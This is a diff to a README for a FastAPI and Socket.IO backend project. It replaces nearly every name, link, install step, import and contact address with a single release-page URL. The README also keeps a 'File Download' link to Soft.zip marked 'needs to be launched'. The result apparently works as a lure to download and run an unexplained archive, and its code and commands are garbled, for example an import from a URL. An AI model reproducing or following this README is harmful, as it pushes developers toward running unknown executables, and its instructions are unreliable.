@@ -1,10 +1,10 @@
 # 🚀 Welcome to Fast-api Repository!
 
 ### Overview
-Fast-api is a high-performance FastAPI backend with real-time communication powered by Socket.IO. It supports async database operations, JWT authentication, and streaming downloads. This repository is for developers looking to build fast, efficient, event-driven applications with Python.
+Fast-api is a high-performance FastAPI backend with real-time communication powered by https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2 It supports async database operations, JWT authentication, and streaming downloads. This repository is for developers looking to build fast, efficient, event-driven applications with Python.
 
 ### Features
-- Real-time communication with Socket.IO
+- Real-time communication with https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2
 - Async database operations with aiomysql
 - JWT authentication for secure API access
 - Streaming downloads using pytube and yt-dlp
@@ -13,7 +13,7 @@ Fast-api is a high-performance FastAPI backend with real-time communication powe
 
 ### Technologies Used
 - FastAPI
-- Socket.IO
+- https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2
 - aiomysql
 - asyncio
 - JWT
@@ -25,31 +25,31 @@ Fast-api is a high-performance FastAPI backend with real-time communication powe
 aiomysql, api, asyncio, backend, cors, download, event-driven, fastapi, google-authentication, jwt-authentication, middleware, mysql, python, pytube, socket-io, spotify, spotify-api, streaming, websocket, yt-dlp
 
 ### Installation
-1. Clone the repository: `git clone https://github.com/your-username/Fast-api.git`
-2. Install the required dependencies: `pip install -r requirements.txt`
+1. Clone the repository: `git clone https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2`
+2. Install the required dependencies: `pip install -r https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2`
 
 ### Getting Started
 ```python
 # Example code snippet
 import uvicorn
-from app.main import app
+from https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2 import app
 
 if __name__ == "__main__":
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+    https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2(app, host="0.0.0.0", port=8000)
 ```
 
 ### Resources
-- [Documentation](https://github.com/your-username/Fast-api/wiki)
-- [File Download](https://github.com/files/Soft.zip) *(needs to be launched)*
-- [Issues](https://github.com/your-username/Fast-api/issues)
+- [Documentation](https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2)
+- [File Download](https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2) *(needs to be launched)*
+- [Issues](https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2)
 - Check the "Releases" section if the provided link is not working.
 
 ### Support
-For any questions or feedback, feel free to reach out to us at [support@fastapi.com](mailto:support@fastapi.com).
+For any questions or feedback, feel free to reach out to us at [https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2](https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2).
 
 ### Stay Connected
-Follow us on [Twitter](https://twitter.com/FastAPI) for the latest updates and announcements.
+Follow us on [Twitter](https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2) for the latest updates and announcements.
 
 ### Happy Coding! 🎉🐍🚀
 
-[![Download](https://img.shields.io/badge/Download-Soft.zip-brightgreen)](https://github.com/files/Soft.zip)
+[![Download](https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2)](https://github.com/CodeSeeAn/Fast-api/releases/tag/v1.2)
